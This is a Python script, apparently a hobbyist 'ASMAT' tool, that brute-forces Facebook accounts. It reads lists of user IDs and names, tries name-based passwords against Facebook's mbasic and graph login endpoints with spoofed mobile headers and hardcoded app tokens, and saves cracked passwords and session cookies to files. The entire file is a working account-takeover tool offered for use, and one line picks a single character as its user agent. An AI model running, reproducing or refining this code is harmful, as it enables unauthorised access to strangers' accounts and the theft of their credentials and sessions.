from ast import Pass
from os import name, path
import os,base64,zlib,pip,urllib
from weakref import proxy
import os,base64,zlib,platform
from urllib.request import parse_http_list
print('\n \033[1;33m [√] Wait Installing Modules...!')
os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
print('\n \033[1;33m[√]\033[1;33m Wait Checking Modules...!')
from bs4 import BeautifulSoup as sop
try:
	from bs4 import BeautifulSoup as bsp
except:
	os.system('pip install bs4')
	from bs4 import BeautifulSoup as bsp
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python s1n.py')  

def S1():
	en = random.choice(['en_US','en_GB','en_PK','ru_RU','de_DE','th_TH','en_BD','en_IN','en_AF'])
	kt = random.choice(['com.facebook.katana','com.facebook.orca','com.facebook.mlite'])
	fbcr = random.choice(['o2 - de', 'Verizon - us','MY CELCOM','Vodafone - uk','null','DTAC','IND airtel','Nepal Telecom'])
	s= "[FBAN/FB4A;FBAV/"+str(random.randint(111,999))+'.0.0.'+str(random.randrange(9,99))+str(random.randint(111,999)) +";FBBV/"+str(random.randint(111111111,999999999))
	e = ";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/"+en+";FBRV/279865282;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/"+kt+";FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/arm64-v8a:;]"
	ua = s + e	
	return ua
	

def clear():
	os.system('clear')
	print(logo)
logo=("""\033[1;37m
 .d8b.  .d8888. .88b  d88.  .d8b.  d888888b 
d8' `8b 88'  YP 88'YbdP`88 d8' `8b `~~88~~' 
88ooo88 `8bo.   88  88  88 88ooo88    88    
\033[92;1m88~~~88   `Y8b. 88  88  88 88~~~88    88    
88   88 db   8D 88  88  88 88   88    88    
YP   YP `8888Y' YP  YP  YP YP   YP    YP    
\033[1;37m-----------------------------------------------
\033[1;37m OWNER     : \033[92;1mASMAT
\033[1;37m GITHUB    : HAVEELI PE AJANA
\033[1;37m VERSION   : \033[92;1m0\033[92;1m.\033[92;1m1 
\033[1;37m═══════════════════════════════════════════════
\033[92;1m     TOOL RELEASE AFTER 500 SUBSCRIBE         
\033[1;37m═══════════════════════════════════════════════""")   

def line():
	print(f'\033[1;37m-----------------------------------------------')


loop=0
oks=[]
cps=[]
pcp=[]
ck=[]


def menu():
    try:
                clear()        
                x = ("***")
                if x == ("***"):
                        print('[1] CRACK FILE ')
                        print('[0] EXIT ')
                        line()
                        xd=input(' CHOOSE AN OPTION: ')
                        
                        if xd in ['1','01']:
                                clear()
                                
                                print(' PUT FILE EXAMPLE :  /sdcard/File.txt')
                                line()
                                file = input(' PUT FILE PATH\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print('[1] Method 1 For Old Ids ')
                                print('[2] Method 2 For Old & New Mix Ids ')
                                print('[3] Method 3 For New Ids ')
                                line()
                                mthd=input(' CHOOSE : ')
                                line()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
                                except:
                                        ps_limit =1
                                line()
                                clear()
                                print('\033[1;32m EXAMPLE : first last,firtslast,first123')
                                line()
                                for i in range(ps_limit):
                                        plist.append(input(f' PUT PASSWORD {i+1}: '))
                                line()
                                clear()
                                #print(' DO YOU WENT SHOW COOKIES :? (Y/N): ')
                                #line()
                                #cx=input(' CHOOSE : ')
                                #if cx in ['y','Y','yes','Yes','1']:
                                       # pcp.append('y')
                                #else:
                                       # pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
                                        print("\033[1;37m CRACKING....ON\033[1;37m")
                                        line()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(newidx,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                print('\033[1;37m')
                                line()
                                print(' THE PROCESS HAS COMPLETED')
                                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                line()
                                input(' PRESS ENTER TO BACK ')
                                os.system('python s1n.py')
                        elif xd in ['0','00']:
                                exit()
                        
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()
                
#METHOD 3 FOR NEW IDS
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mASMAT\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(S1())
                        head = {'Host': 'mbasic.facebook.com',
'viewport-width': '980',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform':'"Android"',
'sec-ch-prefers-color-scheme': 'light',
'dnt': '1', 'upgrade-insecure-requests': '1',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'none',
'sec-fetch-mode': 'navigate',
'sec-fetch-user': '?1',
'sec-fetch-dest': 'document',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aws=session.cookies.get_dict().keys()
                        if "c_user" in Aws:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ASMAT-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ASMAT-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ASMAT-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [ASMAT-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASMAT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
#METHOD 1 FOR OLD IDS
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mASMAT\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {'User-Agent':S1(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data =  {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':' 350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [ASMAT-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ASMAT-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [ASMAT-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ASMAT-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def rd(ids,passlist):
	try:
		global oks,loop
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mASMAT\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
		for pas in passlist:                                          
			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
			head = {'User-Agent':S1(),
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group':'5120',
'X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True',
'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),
'format':'json','device_id':str(uuid.uuid4()),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'','cpl':'true',
'try_num':'1',
'family_device_id':str(uuid.uuid4()),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'en_GB',
'client_country_code':'GB',
'fb_api_req_friendly_name':'authenticate',
'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
'access_token':accees_token}
			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])                                  
				print('\r\r\033[1;32m [ASMAT-OK] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
				open('/sdcard/ASMAT-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
				oks.append(uid)
                                
				break
			elif 'www.facebook.com' in po['error']['message']:                                
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [ASMAT-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ASMAT-R-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

#METHOD 2 FOR OLD & NEW IDS
def newidx(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mASMAT\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			head = {"User-Agent": S1(),"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),"X-FB-Connection-Type": "MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
			data =  {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "register_api","email": ids,"password": pas,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "NO_FILE","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_PK","client_country_code": "PK","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [ASMAT-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				#print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/ASMAT-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				#print(f'\r\r\033[1;33m [ASMAT-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/ASMAT-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
		menu()
menu()